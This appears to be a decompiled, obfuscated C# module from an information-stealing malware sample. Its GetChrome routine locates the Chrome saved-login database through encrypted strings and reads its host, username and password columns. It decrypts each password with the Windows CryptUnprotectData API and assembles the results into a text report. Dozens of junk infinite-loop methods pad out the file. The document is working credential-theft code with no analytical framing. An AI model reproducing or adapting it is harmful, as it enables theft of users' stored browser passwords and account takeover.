using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using VJJks;
using oEkqK;
using sqYNh;

namespace YPcnW;

[StandardModule]
internal sealed class lTVpS
{
	[Flags]
	public enum wlRab
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZeCIP
	{
		public int cbSize;

		public wlRab dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct tHGWa
	{
		public int cbData;

		public IntPtr pbData;
	}

	public static string cUtJB;

	public static string GetChrome()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + vCJaB.RotateRight("WBjjbg`W>cmjh`WPn`m\u001b?\\o\\W?`a\\pgoWGJbdi\u001b?\\o\\");
		string text2 = "";
		try
		{
			object obj = new scYNh(text);
			NewLateBinding.LateCall(obj, (Type)null, "ReadTable", new object[1] { NnKXl.B("203a8BAabkyoXxM9zgft0w==", "heej") }, (string[])null, (Type[])null, (bool[])null, true);
			if (File.Exists(text))
			{
				int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(obj, (Type)null, "GetRowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1));
				for (int i = 0; i <= num; i++)
				{
					object[] array = new object[2]
					{
						i,
						NnKXl.B("KbYu2cteK9vpI7zx4Cz/Dw==", "heej")
					};
					object[] array2 = array;
					bool[] array3 = new bool[2] { true, false };
					object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array2, (string[])null, (Type[])null, array3);
					if (array3[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
					}
					string text3 = Conversions.ToString(obj2);
					object[] array4 = new object[2]
					{
						i,
						NnKXl.B("aCBkXi1Vf4NnU/WxCXsbVw==", "heej")
					};
					object[] array5 = array4;
					array3 = new bool[2] { true, false };
					object obj3 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array5, (string[])null, (Type[])null, array3);
					if (array3[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(int));
					}
					string text4 = Conversions.ToString(obj3);
					Encoding @default = Encoding.Default;
					object[] array6 = new object[1];
					object obj4 = obj;
					array = new object[2] { i, null };
					string text5 = (string)(array[1] = vCJaB.RotateRight("k\\nnrjm_Zq\\gp`"));
					array4 = array;
					object[] array7 = array4;
					array3 = new bool[2] { true, false };
					object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "GetValue", array7, (string[])null, (Type[])null, array3);
					if (array3[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(int));
					}
					array6[0] = RuntimeHelpers.GetObjectValue(obj5);
					object[] array8 = array6;
					bool[] array9 = new bool[1] { true };
					object obj6 = NewLateBinding.LateGet((object)@default, (Type)null, "GetBytes", array8, (string[])null, (Type[])null, array9);
					if (array9[0])
					{
						NewLateBinding.LateSetComplex(obj4, (Type)null, "GetValue", new object[3]
						{
							i,
							text5,
							RuntimeHelpers.GetObjectValue(array8[0])
						}, (string[])null, (Type[])null, true, false);
					}
					string text6 = Decrypt((byte[])obj6);
					if ((Operators.CompareString(text4, "", false) != 0) & (Operators.CompareString(text6, "", false) != 0))
					{
						cUtJB = Environment.NewLine + "Host: " + text3 + Environment.NewLine + "Username: " + text4 + Environment.NewLine + "Password: " + text6 + Environment.NewLine;
						text2 += cUtJB;
					}
				}
				if (Operators.CompareString(text2, string.Empty, false) == 0)
				{
					return "No saved data was found!" + Environment.NewLine;
				}
				return text2 + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "No saved data was found!" + Environment.NewLine;
			ProjectData.ClearProjectError();
			return result;
		}
		return null;
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref tHGWa pDataIn, string szDataDescr, ref tHGWa pOptionalEntropy, IntPtr pvReserved, ref ZeCIP pPromptStruct, int dwFlags, ref tHGWa pDataOut);

	public static string Decrypt(byte[] Datas)
	{
		tHGWa pDataIn = default(tHGWa);
		tHGWa pDataOut = default(tHGWa);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		tHGWa tHGWa = default(tHGWa);
		tHGWa pOptionalEntropy = tHGWa;
		ZeCIP zeCIP = default(ZeCIP);
		ZeCIP pPromptStruct = zeCIP;
		IntPtr intPtr = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, intPtr, ref pPromptStruct, 0, ref pDataOut);
		byte[] array = new byte[pDataOut.cbData + 1];
		string result = default(string);
		if (pDataOut.pbData == intPtr)
		{
			return result;
		}
		Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
		string @string = Encoding.Default.GetString(array);
		return @string.Substring(0, @string.Length - 1);
	}

	static void XkhQd()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void bvayR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Xueou()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rBYTw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Chddc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void XWmcf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void jYsjZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void UuEQs()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void heYqn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TjkGI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void vCVdT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ibiNn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MpUEz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OwwkW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tfjKx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wVbXj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rmQfx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KLJOy()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GJMEd()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kNRfp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void utWDV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QifCY()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cxluS()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yHwck()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void aFRRg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void MvdgB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void oOOpx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void bBbmg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void FCNes()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void HJpvP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mrcjq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void phHjO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kxJrq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DWCZr()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yVFQV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void SbzgK()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dJEFD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yjzEG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void LyTKB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void hIeqG()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void IGzSP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void twMhi()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Jdvqf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JDKnB()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void nDvfN()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void pKYLx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VHLkL()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Ywokw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void SNqsZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kljoM()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gknfE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Bdhvr()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xKmGl()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gyiFo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sBCLj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PXNsn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qHhhw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OMtiD()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void qeeGO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rErpj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void VSduv()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KZGMf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DIslt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GxXze()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void BPZIH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TBSEI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void czVtz()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wGQLo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tZiih()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void POehk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void bdxaf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void LmJIj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Zkewt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JgbFH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void agnSf()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tOqvJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yXoPp()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void rHOQZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void CCBFq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xcaIw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
